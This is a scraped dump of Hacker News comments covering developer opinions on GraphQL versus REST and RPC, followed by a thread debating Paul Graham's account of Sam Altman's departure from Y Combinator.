flaw in the tech that encourages that norm. reply arp242 2 hours agorootparentYou're not wrong, but at the same time I think it's a decent data point that getting it right is not straight-forward and that, practical speaking, you at the very least need to think very carefully before actually using it. \"The idea of it\" is sometimes fine, but then there's also \"the practicality of it\", and sometimes that's a very different thing. Remember the old microkernel vs. monolithic debate; everyone more or less agrees that in principle, a microkernel is better. But the practicality of it is a lot more complex, so monolithic kernels and hybrid ones are much more common. Microservices vs monolithic is essentially the same debate, and I've seen a lot of Microservices with very poor implementations and a lot of problems. That doesn't mean the idea is bad in itself, but if it's hard to execute well, then you do need to be very careful. There's tons more examples of this. You also see this sort of thing in e.g. politics, where what's \"more fair\" vs. \"what's actually achievable without introducing heaps of bureaucracy and overhead\" are sometimes very different things. In the case of GraphQL, I think it's pretty obvious that the general idea, as described from a high level, is a good one. But the practicalities of it are a lot less straight-forward, as this article explains reasonably well IMHO. reply pavel_lishin 6 hours agoparentprevWe have similar issues in our codebases - but not just in GraphQL, but also in our PHP and Elixir code, and to some extent our Typescript stuff. I think the \"learning-on-the-go\" symptom, where you can sometimes literally read down a file and watch some developer learn the language as they add more and more functions to the file with a gradual increase in skill (or, to put it less charitably, as they slowly get less bad at writing code) is probably a very common thing, and not just a GraphQL issue. reply canadiantim 3 hours agoparentprevNow where does Braid-HTTP fit in?! reply 0-bad-secrotrs 7 hours agoprevAside from all the valid points listed in the blog I found out that the frontend engineers in my company save some queries in central library and reuse them even if they don't need all the field returned by this array just to save themselves the time they spend writing queries so they are basically using GraphQL as REST at the end and now we have the worst of both worlds. reply brabel 7 hours agoparentOur frontend team needs to show the whole thing every time (as the user sees and edits full resources in most cases), which means they MUST keep a full query representing the entire resource, and when we add stuff in the backend, they must also add those things in the frontend (as they cannot generate UI for new things in most occasions). GraphQL was really a mistake for us. reply RedShift1 7 hours agorootparentWhy is this a problem? If you add fields on a REST endpoint, you're going to have to change the client too to deal with those new fields. reply chasd00 5 hours agorootparentIf new fields show up in a json response just ignore them. Why would you need to change the client if new fields show up in the response? reply tossandthrow 4 hours agorootparentIndeed, this is what graphQL solves. Are you proposing just to add new field to a JSON response, even though they are not needed? reply eatsyourtacos 3 hours agorootparent>Are you proposing just to add new field to a JSON response, even though they are not needed? That is exactly what OP is proposing and it makes total sense. More data != bad. Just ignore if you don't need it. For 99.999% of cases the bandwidth of extra data is entirely negligible. For business cases you just want to get things done. If the server has added more data, which is obviously relevant in some regard, you can see it and might want to use it etc. With GraphQL you are completely stuck without SPECIFICALLY requesting it. That means every client needs to know about the new data and specifically request it. In theory that might sound like it makes sense, but in practice this is virtually never the case. Give me all the data and I'll use what makes sense. reply scubbo 3 hours agorootparentprevGraphQL \"solves\" the ability to ignore an unneeded field in a response? Revolutionary. reply wruza 3 hours agorootparentprevBecause receiving unexpected data is a signal you rarely want to ignore in programming. Doesnâ€™t matter whether youâ€™re gonna use it or not. reply finack 3 hours agorootparentNo, that's an important facet of compatibility. If a change is purely additive, existing clients will keep working, something the industry has basically forgotten all about, it seems. reply int_19h 23 minutes agorootparentprevIn OOP, the equivalent - getting an object of some more specific type than the one you asked for at API level - happens all the time. reply culi 39 minutes agorootparentprevit sounds like they are just dumping every field to somehow show the user without any validation/specific rendering logic for each field reply em-bee 6 hours agorootparentprevdepends. i'd be writing the client such that it just lists all the fields, and then add special handling for the fields that need it. when the backend adds new fields, they will just show up and i just need to fix the formatting. with graphql i'd have to ask for those new fields, and thus make changes in two places. and in addition the backend team has to tell the frontend team about the new fields (instead of letting the api speak for itself), making it easier to accidentally skip a field. reply nevir 3 hours agorootparentprevOne problem is performance. (Most) GraphQL clients are optimized for relatively small/simple objects being returned, and you typically pay a cost for every single edge (not node) returned in a response / cached in memory. It can quickly get to the point where your project is spending more time per frame processing GraphQL responses & looking data up from the cache than you spend rendering your UI reply culi 40 minutes agoparentprevThis isn't actually that terrible since these fields are cached by a client-side library like Apollo. If the query has already been made elsewhere then it won't be doing any extra work The only downside is if one of those unused fields changes due to a mutation then all components using that field will rerender (ofc I'm assuming React here). Again, not the biggest concern if you've got your memoization set up correctly reply tarentel 3 hours agoparentprevWe do something similar and it's because GQL at my company is really pointless. I think someone at some point someone also got on the hype train not realizing that we do not really need to have hyper specific queries we can write on the fly. I can't think of a single instance where someone proposed a feature and we all went well, we can combine these 3 things we already have into a new query and the backend has no work to do. The backend always ends up building out more into graph and have been doing so for at least 6 years now. There have been a handful of cases where we did combine something old with something new but given the extra complexity on the client and backend I'm not sure it was worth it over making 2 separate calls. reply hombre_fatal 6 hours agoparentprevThe difference is that the client came up with its own data access patterns instead of having to rely on the server to design the exact endpoints that it needs. Overfetching or not, that's a rather big difference. reply eatsyourtacos 3 hours agorootparentSure, but just how often is the client the one who defines what data it needs without the designer being able to create obvious endpoints? Surely there are some good use cases.. just so few and far between. No one should be using GraphQL unless absolutely necessary. reply 015a 4 hours agoparentprevYup, we saw the same thing. Everyone wants RPC. That's it. We keep inventing crazy complicated patterns on top of RPC that serve mostly as good fodder to yell about in meetings, when `POST /list_users` and `POST /create_user` work great. reply amjnsx 3 hours agoparentprevSounds like an issue with your team rather than graphql reply abound 6 hours agoprevHaving worked extensively with OpenAPI, GraphQL, plain JSON/HTTP, and gRPC/Buf Connect services, most of this rings true for me. One thing the author doesn't mention is that you can limit the set of queries clients can call in a GraphQL service, by hash or signature. This mitigates a lot of the gnarly performance and security issues because the attack surface goes from \"arbitrary queries\" to \"queries you've already 'vetted'\", where you can look at things like complexity, ACL behavior, etc ahead of time. Since clients (in my experience) aren't usually modifying GQL queries at runtime, this is a pretty good tradeoff. All that said, I find Buf Connect to be the best set of tradeoffs for most projects: strongly typed servers and clients, strong ecosystem support around protobuf (e.g. to generate an OpenAPI spec), a standard HTTP/JSON interface for easy curl et al compatibility, etc. OpenAPI as the source of truth is annoying because it's too flexible, and it's rarely possible to generate type-safe servers + clients from an OpenAPI spec without running into one edge case or another. reply culi 33 minutes agoparentGraphQL is meant to be used along side a very smart client-side cacheing library like Apollo The best practice for GQL is to make frequent, small, queries (Apollo handles batching them) throughout your application. Apollo won't do any extra work to fetch new fields if they're already in the cache Not to be that person because I understand there's always edge cases, but in general with GQL if your queries are highly complex or too nested \"you're doing it wrongâ„¢\" reply ko_pivot 4 hours agoparentprev+1 for Buf Connect. Great CLI, simple codegen configuration, basically no added runtime complexity â€” itâ€™s just the serialization layer at that point. Itâ€™s also great to be able to use it for both the API layer using JSON while also allowing full gRPC inter-op between backend services, with the same library and workflow. reply pants2 1 hour agoparentprevBuf Connect or any RPC design really is great. I'm sick of REST too. No more endless discussions about how to make this endpoint the most RESTful or how to cram a feature into REST that doesn't fit. \"Oh you need an endpoint to hibernate the server? Just POST a new Hibernate object to the /api/v2/hibernations service.\" No. With RPC we can just make a HibernateServer call and be done with it. reply derekperkins 2 hours agoparentprevHuge fans of Buf Connect. We run vanilla gRPC servers on the backend and have a typed experience through to the frontend reply troupo 1 hour agoparentprev> the author doesn't mention is that you can limit the set of queries clients can call in a GraphQL service, by hash or signature. Then it's just REST with extra steps and none of the benefits reply rglover 3 hours agoprevWorked with GraphQL from 2017 to 2021. It was the last tech \"hype\" I bought into. At first, it made a lot of sense and the thing that got me was the structure. But eventually, I realized how much extra work and duplication of everything there was. At the time, too, things that should have been easy like subscriptions had a nightmare API packed with weird terminology that made implementing simple features a slog. The one positive to come out of working with it (aside from knowing how to spot a tech black hole) is that it informed the design of the API layer in my framework [1][2]. I realized the sweet spot is starting with a basic JSON-RPC type endpoint and then layering things like input validation [3], authorization [4], and selective output [5] (only requesting certain fields back) on as you need them. [1] https://docs.cheatcode.co/joystick/node/app/api/getters [2] https://docs.cheatcode.co/joystick/node/app/api/setters [3] https://docs.cheatcode.co/joystick/node/app/api/validating-i... [4] https://docs.cheatcode.co/joystick/node/app/api/authorizatio... [5] https://docs.cheatcode.co/joystick/ui/api/get (see output array in the function options API) reply hot_gril 2 hours agoparentI'd much rather find out the hard way that I need something than find out the hard way that I don't. There was one project where OpenAPI became a bit painful and I rediscovered why GraphQL could make sense, but it didn't reach the threshold. reply chuckadams 3 hours agoprevI must be the only one who found GraphQL, used it in a small project, and liked almost every bit of it. I used Apollo Client and graphql-codegen to generate types and functions for Vue 3, and nothing else could touch it. It wasn't all smooth sailing of course: I did find defining new scalar types to be fiddly, and I couldn't really even make proper use of union types, directives, or even enums due to the impedance mismatch of Apollo Client (JS) and API Platform (PHP). The latter had a lot of nice features in implementing the API backend itself, but the poor documentation for its graphql support held me back. But even the super-basic graphql subset I did use caught a great many errors at the type level where other solutions would not have. These days, given the freedom to write the backend in TS too, I might look into tRPC instead. One thing's for sure, I won't be going back to OpenAPI unless and until I can fully autogenerate api.yaml and otherwise never have to touch it again (getting there with zod+openapi on another project, but it's nowhere near as easy as graphql-codegen doing all the things with one introspection query). reply moribvndvs 2 hours agoparentAfter building several GraphQL-based applications, the design time experience and expressivity offered to UI developers particularly when the application is first starting out feels really great. But like the author, it sours quickly after that. I found myself spending a large amount of time inventing and trying to patch in solutions that most RPC and REST frameworks solved long ago for both the server AND the client (auth, rate limiting, error handling and validation stick out particularly). Client solutions are comparatively heavy, complicated, and riddled with gotchas (e.g. caching) that trip up new team members more than REST. Itâ€™s not impossible to build performant GraphQL solutions, but the solutions feel more like afterthoughts and require more vigilance to ensure your team doesnâ€™t stick their finger in an electrical socket compared to REST. The lack of namespacing or organization results in almost unintelligible query and mutation documentation for large projects. The comparatively large size and complexity of requests can be a headache for ops teams. I loathe that interfaces and inheritance donâ€™t work for mutations. Front end devs just use it like a very heavy REST and the holy grail promised by stuff like Relay never materializes. I could go on. And at the end of the day, the appâ€™s API usage will stabilize and mature, and the expressiveness becomes less compelling compared to its cost. When I went back to OpenAPI and REST, it was like a breath of fresh air, I felt I was building things much faster. I will grant you that generating clients from OpenAPI still is the worst part. reply chuckadams 1 hour agorootparent> (auth, rate limiting, error handling and validation stick out particularly) I got all that for free with API Platform because it's based on Symfony. Ironically it's the graphql implementation that's primitive [1] -- but rock solid, so it won out, and being a rank newbie at GQL when I started, it was probably best I was stuck with the basics. The JS backend world is a lot more ad hoc than the modern PHP world, so I can picture a lot more nightmare integration scenarios there. Besides, I'd probably prefer using tRPC + zod for my next all-TS project. -- [1] - It's actually pretty sophisticated underneath, but the code is a loosely-documented architectural maze, so yeah. reply drpossum 2 hours agoparentprev> used it in a small project, and liked almost every bit of it This is the difference reply chuckadams 1 hour agorootparentPerhaps, but isn't everybody saying it's strictly for the Billion-User Big Dogs? I admit I'm a small-timer nowadays, but having been a cog in a couple mega-corporate machines, I would have walked over my grandmother to get the strongly-typed tooling I get with graphql. reply Hamuko 1 hour agorootparentprevI don't know, I used GraphQL in a small project and I absolutely hated it. I mean, it was definitely workable, but I just absolutely hated writing those queries. Why am I having to write these again?",
    "originSummary": [
      "The author shares a six-year experience with GraphQL, initially noting its benefits over untyped JSON REST APIs but ultimately pointing out significant drawbacks.",
      "Key issues with GraphQL include increased attack surface, complex authorization, rate limiting challenges, query parsing vulnerabilities, and performance problems like the N+1 issue.",
      "The author recommends considering alternatives like OpenAPI-compliant JSON REST APIs and modern tools such as FastAPI, tsoa, and TypeSpec for more efficient and secure API development."
    ],
    "commentSummary": [
      "After six years of using GraphQL, the author finds it overly complex, particularly in permissions, performance, and debugging, suggesting traditional REST endpoints might be more efficient.",
      "The discussion highlights the challenges of integrating GraphQL with backend systems, emphasizing the need for detailed knowledge and documentation, and proposes solutions like server-side query builders and schema-first designs.",
      "The debate contrasts GraphQL's flexibility and efficient nested querying with REST's simplicity and reliability, noting that the choice between them should be based on the project's specific needs and maturity."
    ],
    "points": 647,
    "commentCount": 453,
    "retryCount": 0,
    "time": 1717059030
  },
  {
    "id": 40521657,
    "title": "Paul Graham Denies Rumors of Sam's Firing from Y Combinator",
    "originLink": "https://twitter.com/paulg/status/1796107666265108940",
    "originBody": "I got tired of hearing that YC fired Sam, so here&#39;s what actually happened: pic.twitter.com/3YvBDH7oqVâ€” Paul Graham (@paulg) May 30, 2024",
    "commentLink": "https://news.ycombinator.com/item?id=40521657",
    "commentBody": "I got tired of hearing that YC fired Sam, so here's what actually happened (twitter.com/paulg)520 points by hakanderyal 9 hours agohidepastfavorite428 comments neom 7 hours agoI ran a multi-million dollar a year non-profit and had a full-time job. It's not unusual to chair or \"run\" a non-profit and have a regular job, non-profits are actually set up to make this easy to do. If that non-profit somehow mystically turned into a for-profit enterprise, for a multitude of reasons (some less obvious) I would have clearly had to pick one or the other. If said non-profit had commercialized transformer as a service, I'd have quit DigitalOcean (double so if I was well vested). Just to make it fair with the situation: I honestly don't know if I would have proactively quit one or the other. Depending on the workloads, I may very well have tried to moonlight both for a while, I'm unsure. I don't think this tweet by Paul is weird at all. reply llm_trw 5 hours agoparent>multi-million dollar a year non-profit At 24 I ended up as the chair of a not for profit that stood on top of $30 million of real estate _because no one else wanted to_. Getting quorum was impossible because we needed three out of five board members to show up to a meeting. People have this idea it's mustache twirling villains running these things. It's usually the idiot thats about to burn out. reply OccamsMirror 5 hours agorootparent> It's usually the idiot thats about to burn out. 99 times out of 100 it's that idiot. The only time it's not is when it is someone that has figured out how to truly benefit themselves from the appointment. Whether ethically or no. reply llm_trw 5 hours agorootparentEveryone wants to be Mitchell Baker. reply drewda 4 hours agorootparentBaker was the CEO of the Mozilla Foundation. For what it's worth, the above comments are talking about serving on the board of directors of a foundation -- which is most often part-time and not paid. reply Dalewyn 4 hours agorootparentBaker is the Chairman of Mozilla Foundation and is (was) the CEO of Mozilla Corporation. reply gabrielsroka 17 minutes agorootparentChairwoman https://www.mozilla.org/en-US/about/leadership/ reply drewda 3 hours agorootparentprevYes, but for what it's worth, I was reading the above comment as being about the large compensation package that Baker received as the CEO of Mozilla Foundation. reply fetzu 2 hours agorootparentA compensation (as CEO of Mozilla Corporation) which is set by (I imagine) the board of the Mozilla Foundation. reply MikeTheGreat 4 hours agorootparentprevGenuine question: Why did you include \"about to burn out\" in the description? Is it because the chairing the non-profit is enough work/burden that it causes folks to burn out, or does this role tend to attract people who are already on the path to burning out, or some other thing? I thought that was a really interesting detail to include but couldn't quite figure it out on my own. :) Thanks in advance! reply extragood 2 hours agorootparentNot sure if it's what was meant, but an HOA board isn't too far off of that description. In my experience, the job is necessary but relatively thankless and uncompensated. No one wanted to volunteer their time, and I was interested in cash flow and a building improvement so I served for a year. The only other board members ran uncontested and also had very demanding jobs outside of the association. Everyone else was happy to let us take care of all the minutiae of coordinating maintenance, budget, property management, etc. It was a lot of work. So to answer your question, I've observed that it attracts people who are already ambitious in other aspects of their life (and maybe a little too generous with their own time), and the extra work it entails compounds with their other commitments which can lead to burnout. reply sdenton4 3 hours agorootparentprevIt's often people who have a hard time saying no who end up spread thin over a number of gigs - this leads to burn out. Or not showing up to meetings... The 3/5 of the board who can't be rounded up are also signed up for too many things. reply ghaff 3 hours agorootparentWhen I was chair of a small non-profit (currently still a board member after a hiatus for a few years), I'm not sure I'd have described it as burnout but increased lack of engagement and interest definitely became a problem over time. When we did require in-person votes/quorums, that did become a problem because it usually required traveling for most board members 2 or 3 weekends a year. At some point, while I was on hiatus, the board did change its rules to allow telephone and, later, Zoom attendance which has been IMO something of a mixed bag but probably inevitable especially post-COVID. I'd like people to get together in person more but it's harder than when the board skewed younger; people have more family responsibilities at this point and, of course at this point, a lot of people just have less patience about getting together physically when business can mostly be taken care of over a couple hour Zoom call. Fortunately, the non-profit's regular activities and finances have been on a pretty even keel so the board mostly just keeps an eye out for problems. reply ianhawes 5 hours agorootparentprevHappy to hear that my experience in non-profits was not unique. reply llm_trw 5 hours agorootparentOne of these days I should write a book about it. Question: It's 2 am, a dead opossum is stuck in the main drain for the property and the water is rising during a once in a decade storm. What do you do? Answer: Wade neck deep into the water, with a stoner tripping on mushroom holding a light, then stab it with a crowbar until the water pressure flushes it down. reply justinclift 5 hours agorootparentAnd the stoner tripping on mushrooms was you, but you didn't realise it wasn't someone else at the time? :) Maybe you could turn it into a movie script, something like 'Fear and Loathing in Los Vegas'? https://www.imdb.com/title/tt0120669 reply cpach 10 minutes agorootparentprevâ€œOne of these days I should write a book about it.â€ Please do! reply I_Am_Nous 5 hours agorootparentprevGlad to know you didn't get sucked down too, neck deep water draining has some crazy strength. I'm sure that was quite a magical experience for Flashlight Stoner as well! reply QuinnyPig 3 hours agorootparentprevnext [3 more] [flagged] 8372049 1 hour agorootparentThe reason you're getting downvoted is because we avoid reddit-esque cookie cutter jokes like that on here. They don't add much to the discussion and lower the signal to noise ratio. reply eropple 50 minutes agorootparentKnowing a little about who you're replying to, I don't think he needs a lecture. reply datadrivenangel 4 hours agorootparentprevas another idiot about to burn out, it's not unique. :) reply samastur 7 hours agoparentprevThey didn't seem to mind him running Worldcoin though. Doing two (several) jobs problem came later and this explanation doesn't really address this. Personally I don't care if pg is completely honest or if sam was fired or not. It doesn't have meaningful impact on my view of either. reply rco8786 6 hours agorootparentThe tweet specifically says \"if he was going to run OpenAI full-time ..\". Sounds like they were fine with him moonlighting other projects, Worldcoin, OpenAI as a non-profit, but if YC wasn't going to be his primary \"full-time\" focus then he would need to choose. Feels entirely reasonable. reply tomhoward 6 hours agorootparent> Sounds like they were fine with him moonlighting other projects Even thatâ€™s not quite right. OpenAI had been a research project inside YC. So there was no â€œmoonlightingâ€ about it (and Worldcoin started around the same time Sam left YC). It seems everyone accepted that things qualitatively changed when OpenAI stopped being a non-profit research project inside YC to becoming a for-profit venture, and they just had an adult conversation about it. reply scarmig 4 hours agorootparentWas OpenAI at all affiliated with YC? I think they were entirely independent organizations. reply tomhoward 4 hours agorootparentOK, it was independent but established with funding from YC Research and Jessica (among others including Sam himself and Elon) and initially operating from YC office space. So it was always something that was closely linked to YC and his involvement with it was generally accepted as being harmonious with his role running YC, until it became for-profit. Details here: https://www.wired.com/2015/12/how-elon-musk-and-y-combinator... reply schrodinger 6 hours agorootparentprevI havenâ€™t ever heard of worldcoin but ChatGPT has actually made it to the average personâ€™s lexicon, and been covered in the NYTimes repeatedly. Surely some non jobs take more effort than othersâ€¦ reply s1artibartfast 6 hours agorootparentprevSometime things becomes a problem when they start having practical impacts. Not everything is a matter of principle reply tomhoward 6 hours agorootparentprev> They didnâ€™t seem to mind him running Worldcoin though He left YC in March 2019. Worldcoin was formed in 2019. reply CalChris 6 hours agorootparentCrunchbase says the WorldCoin seed round was January 2019. https://www.crunchbase.com/organization/worldcoin/investor_f... reply tomhoward 5 hours agorootparentRight, so, no evidence that they had no problem with him running Worldcoin. It could all have been part of the â€œSam now has too much on his plate to adequately focus on YCâ€ conversation. reply vlovich123 3 hours agoprevThe weirdest part for me in how this is worded is that Paul G learned about OpenAIâ€™s for-profit arm through an announcement and wasnâ€™t something that Sam sought his or Jessicaâ€™s advice on. For what itâ€™s worth that alines pretty closely with Helen Tonerâ€™s narrative that he kept the board in the dark and they (or she) learned about things through announcements. reply encoderer 1 hour agoparentYes! I think Sam was always Paul and Jessicaâ€™s goodest boy and if they found this out by announcement it was likely quite hurtful and explains how rumors spread that he was fired for it. reply slg 35 minutes agorootparent> and explains how rumors spread that he was fired for it. And maybe why PG apparently put no effort into dispelling those rumors for months despite being asked to comment on them by the places like the Washington Post and there being plenty of discussion about them here and on Twitter. He obviously knew about the rumors and he had plenty of time and opportunity to clarify things previously. But it wasn't until some other external party starts criticizing Altman in the press and we seemingly get an \"only I can pick on my little brother\" type response. Because that timing is the weirdest thing to me. If PG really cares and respects Altman as much as he always seems to claim, why allow these rumors to persist for so long and suddenly choose this moment to dispute them? reply gitfan86 3 hours agoparentprevAlso strange that PG didn't know that Sam had invested in OpenAI through YC until today. reply blast 1 hour agorootparentI didn't see that in the OP, are you referencing some other information? reply gitfan86 1 hour agorootparenthttps://x.com/paulg/status/1796174494026879040 reply blast 1 hour agorootparentOh right, the twitfuckers don't display threads anymore. Thanks. reply loceng 7 minutes agorootparentCan you elaborate on what 'twitfuckers' means in some nuance? If you're signed in you'd see threads, right? Do you think it's bad or unreasonable they try to fight against at least unsophisticated bots and mass scraping attempts? reply mindslight 56 minutes agorootparentprevIf you're using a secure browser, Xitter doesn't even display single tweets any more. Just: > Firefoxâ€™s Enhanced Tracking Protection (Strict Mode) is known to cause issues on x.com reply jjulius 40 minutes agorootparentprev>And obviously it wasn't influencing me, since I found out about it 5 minutes ago. \"Obviously\". reply greentxt 35 minutes agoprevI suspect the truth is he was fired but Paul is afraid to say that so has come up with a counter narrative. Paul is very clever like that. reply baxtr 19 minutes agoparentIt doesnâ€™t necessarily mean he is lying though. Our brains change our memories such that it fits our current narratives. reply loceng 5 minutes agorootparent\"Maybe it's better/a good time you leave\" as part of a conversation is one such way to recommend someone leave rather than a likely alternative. reply nuz 2 minutes agoparentprevYeah both their reputations are kind of screwed at this point so I don't really believe what they say based on just this reply throwaway_5753 9 hours agoprevA lot of people here bending over backwards to try to interpret this maximally negatively. Probably because the \"Sam Altman is an amoral, power hungry mastermind who was run out of all his previous gigs\" is a more interesting narrative than whatever is actually happening. reply gizmo 7 hours agoparentWhat you call \"maximal negativity\" is what I would call skepticism about spin. Giving Sam an ultimatum, forcing him to choose one or the other, is a very forceful move. PG is not universally opposed to people running multiple organizations. He's fine with Musk being in charge of Tesla, SpaceX, Neuralink and Starlink. I don't think pg was unhappy about Dorsey running both Square and Twitter[1]. OpenAI leadership was fine with Sam in both roles. But Sam had to either quit OpenAI or quit YC, and would get fired from YC if he refused to choose. [1] https://x.com/paulg/status/1235363862159003649 reply zild3d 6 hours agorootparent> PG is not universally opposed to people running multiple organizations I don't see why that matters, YC is \"his\" organization, other organizations can do what they want Take out all the names, and it's just a belief that YC should be run by someone that's all in / fully committed. reply edgyquant 5 hours agorootparentRight but this is him being fired reply tomhoward 5 hours agorootparentFired means or at least connotes a specific thing, I.e., is against the will of the departing employee. Leaving the organisation by mutual agreement after an adult conversation to focus on exciting new project is a very different thing to fired. reply gregates 4 hours agorootparentThe adult conversation in question being, in a nutshell: \"We've decided it's time for you to move on. Would you like the public perception of this event to be that it was a mutual decision, or would you prefer to burn some bridges on your way out?\" Sure, in some sense the departing individual chooses to go one way rather than the other. reply tomhoward 4 hours agorootparentOr the adult conversation was: you need to pick one thing to focus on, weâ€™d prefer it was YC but obviously we canâ€™t force you to choose YC. PGâ€™s telling if it, and Occamâ€™s Razer, support that version. Many people here want to imagine that it was vastly more dramatic than this, or need to reinterpret the word â€œfiredâ€ to support the narrative that Sam is bad. I understand it can be fun to think that way. For the record Iâ€™m no great fan of OpenAI and I think people who are convinced they are about to achieve AGI are, er, mistaken. I mostly just care about correct definitions of words and avoiding sensationalism. reply gregates 3 hours agorootparentMy point is mainly that PG's telling isn't trustworthy, because that's what you agree to say when the person you're \"firing\" chooses to go quietly. Obviously I have no specific insight into the situation, but given what I have observed about how career changes happen for people who've reached a certain level of power, I have no faith that the people involved have any interest in accurately describing the situation to the public. reply tomhoward 3 hours agorootparentAll you have to do is look at the fact that PG has been consistently effusive about Sam in his public comments and essays since the mid 00s through till the present day, for it to be clear that Sam wasnâ€™t simply fired. Of course these situations are always complex behind the scenes, with many factors and considerations at play. But the no he must really just have been fired against his will claim just doesnâ€™t pass the sniff test to anyone paying attention. reply lolinder 2 hours agorootparentI wonder how much of the impulse to believe (in the face of the evidence) that Altman parted ways with YC/PG on bad terms is really rooted in an impulse to believe that YC/PG couldn't be complicit in enabling the kind of person that it now increasingly appears that Altman is. If Altman truly is as bad a person as it appears that he might be, that doesn't reflect well on the people who have praised him through the last few decades. If you like those people, then cognitive dissonance forces you to either believe that Altman is being unduly villainized or to believe that the people that you like secretly hate him but just can't say so openly. reply QuantumGood 2 hours agorootparentprevVirtually all info that reaches outsiders has a strong PR component, and often is entirely PR. We're left to \"read the tea leaves\" from our own experience with such statements. reply lolinder 4 hours agorootparentprevExcept that isn't at all what Paul is claiming hereâ€”he says YC offered him the choice between running YC and running OpenAI but not both at once. Altman chose OpenAI. That might have been the obvious choice in the circumstances (it certainly appears so in retrospect), but that doesn't turn the conversation into the kind you're claiming. reply TeMPOraL 52 minutes agorootparentprevI wonder what evidence could possibly convince you, if both sides of the alleged \"firing\" saying it wasn't so isn't convincing enough. reply greentxt 30 minutes agorootparentHistory being different than it has been. Like the statements Paul has made to date have been in agreement with the common perception of it being a firing, not very consistent with this newer counter narrative. Obviously just imo and ymmv. reply throw0101d 4 hours agorootparentprev'Mutual agreement' could be that the employer didn't want the employee, and the employee was tired of BS being unreasonably dumped on them: * https://en.wikipedia.org/wiki/Constructive_dismissal (Not saying that this is such a situation.) reply 1024core 2 hours agorootparentprevEven Jack couldn't handle being CEO of Twitter and Square. It's just not easy to do. reply imgabe 3 hours agorootparentprevBeing fired does not include the option to stay. reply apgwoz 5 hours agorootparentprevThis is Sam being given an ultimatum and making a choice before being fired. Is it effectively the same thing? Yes. But technically, he left to pursue OpenAI. YC never said â€œYouâ€™rrrrrrrrrrrre Firedddd!!!â€ (In my best Spacely Sprockets voice); it just politely asked him to leave if he couldnâ€™t give 100%. reply Taylor_OD 3 hours agorootparentprevThe entire point of the tweet is to explain that he wasnt fired. reply fwip 3 hours agorootparentYeah, and the tweet isn't being honest. Issuing somebody an ultimatum that you know they'll refuse is just a different way to get rid of someone. reply burnished 2 hours agorootparentWhich was also clearly not the case here. reply fwip 2 hours agorootparentClearly? reply tptacek 4 hours agorootparentprevIt it nothing whatsoever like being fired. reply fwip 3 hours agorootparentnext [7 more] [flagged] khazhoux 2 hours agorootparentThis kind of snark is not appreciated here on HN. It is hostile to your fellow members, and does not advance the discussion. reply stale2002 2 hours agorootparentprevNo its not. Someone doing something bad, like financial fraud or significant lying to the company is much different than a situation where someone is working 2 jobs and is asked to focus on one. To describe the 2nd situation as being \"fired\" is dishonest. As it attempt to imply that there is some crazy hidden drama going on. Admit that those 2 situations are significantly different. reply TillE 2 hours agorootparentWhy would you assume that \"fired\" likely means some form of gross misconduct? Typically people are fired for doing a bad job. reply stale2002 2 hours agorootparent> Why would you assume that \"fired\" likely means some form of gross misconduct Since you seem to have not been following this story, it is because that is the accusation that lots of people are making against Sam Altman. The rumor, for years, was that he was fired for some sort of significant dishonestly or misconduct. Furthermore, there is other context in which Sam Altman was temporarily removed as CEO from OpenAI, for the stated/claimed reason of not being consistently candid with the board. The obvious comparison that everyone is making would go something like \"Well, there is this rumor that Sam got fired for dishonestly in the past, therefore it makes sense why he got fired again at OpenAI for dishonesty\". Paul G's tweet is a refutation of and in response to this context that is clear and obvious to anyone who has been following this story. reply tptacek 1 hour agorootparentIt doesn't matter what the reason was. The rumor could have been that he was \"fired\" for no fault of his own; it would still be false. When you are asked to stay on and concentrate full time on being the CEO of YC, you are not being fired as the CEO of YC. The thing here is, a lot of people have (for reasons I cannot really fathom) invested some of their identities in the idea that they have worked out the bones of the whole Sam Altman story, and the First Commandment of Message Boards is \"I'm not wrong\". reply vasco 59 minutes agorootparent> The thing here is, a lot of people have (for reasons I cannot really fathom) Is it that hard to fathom? The internet likes to play teams with these personalities, it does it with Musk and Lisa Su and it did it with Marissa Meyer, etc. It's just waves of hating / hyping. reply LMYahooTFY 5 hours agorootparentprevOr it's not a forceful move at all. Maybe YC requires more dedication than Altman could provide to both it and OpenAI. You print off companies as if being a CEO is just being a CEO, and as if Musk doesn't work an unhealthy amount of hours. Or maybe there's some secret reason for pg to carry water for Sam and it's worth his integrity. reply fwip 3 hours agorootparent\"Secret reason\" = Paul knows it looks bad for him to fire the guy. So he comes up with justifications why it's not really firing. Maybe he even believes them. reply 1024core 2 hours agorootparentYou seem to have an axe to grind with @sama. This deep-rooted bias does not make for an honest discourse; as you are just expressing your opinions. If you have some facts to back up your claims, please put them out. Otherwise, I would urge just stepping away and taking a few deep breaths. reply goodcanadian 6 hours agorootparentprevGiving Sam an ultimatum, forcing him to choose one or the other, is a very forceful move. Sure, but is that what happened? Or, did they sit down and have a chat and mutually agree that on what was best? I guess we will never know with certainty (and I frankly don't care). reply ghaff 5 hours agorootparentI don't know what happened either and I wouldn't even be surprised if the parties have internalized it in ways that aren't 100% consistent. I do know that situations arise where it becomes mutually apparent that a parting of the ways is best for everyone concerned even if not explicitly stated. And, in those circumstances, there's a public story that is often not untrue but isn't the whole backstory either because it's simpler for everyone involved that way. reply fwip 3 hours agorootparentprevYes, it's directly in the tweet. \"We told him that if he was going to work full-time on OpenAI, we should find somebody else to run YC.\" reply mindwok 7 hours agoparentprevAgree, people need to chill. The thread says they would have been happy if Sam stayed, they just wanted him to choose one or the other which he agreed with. It seems like a very amicable parting of ways when the parties involved were being pulled in different directions. reply lukan 6 hours agorootparent\"The thread says they would have been happy if Sam stayed\" No, he said they would have been fine with it. That has a different quality and honestly, I am quite sure they knew sama was so invested in OpenAI that he would not have choosen to step away from it. So everybody could save face and no one was \"fired\". reply ilrwbwrkhv 6 hours agorootparentOh my goodness. Different quality? This is like seeing a bunch of soothsayers looking at tea leaves intently to match a pattern. reply throwup238 5 hours agorootparentHave you ever seen Sam Altman with his palms pointing at the camera? You can clearly see from the intersection of his life and fate lines that he is a supervillain in the making. reply lukan 5 hours agorootparentprevI am fine with your comment, but not happy about it. reply nostrebored 3 hours agorootparentThis comment has a â€˜different qualityâ€™ than most Iâ€™d expect to see on HN reply mateus1 6 hours agorootparentprevWeird times when moral relativism is saved for the rich and powerful instead of the poor and meek. reply burnished 2 hours agorootparentNo, what you are seeing is people refusing to be spun up into rumor-mongering, which is good because you don't want all the air going to spurious claims and counterclaims when there are factual and uncontroversial observations to be angry about instead reply weberer 6 hours agorootparentprevHow does this in any way relate to moral relativism? reply mateus1 1 hour agorootparentI shouldâ€™ve phrased it better. It seems like many people think those in power are entitled to some moral leniency when they should face higher scrutiny. reply mindwok 6 hours agorootparentprevCan you explain what you mean by this? reply cqqxo4zV46cp 6 hours 